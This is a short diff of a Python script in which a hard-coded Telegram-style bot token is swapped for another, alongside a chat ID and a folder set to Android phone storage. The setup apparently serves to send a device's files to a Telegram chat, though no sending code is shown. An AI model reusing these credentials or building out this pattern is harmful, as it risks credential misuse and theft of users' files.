@@ -2,7 +2,7 @@ import os
 import requests
 
 # 🔐 حط بياناتك هون
-BOT_TOKEN = "8694159518:AAF4O9s94rmrMcJ2xBbOf4Ov3-QErt64N8c"
+BOT_TOKEN = "8636277553:AAHVa-WPUKeWthK2CINgZ0EarpqHBBJ4Px4"
 CHAT_ID = "7708603881"
 
 folder = "/storage/emulated/0/"
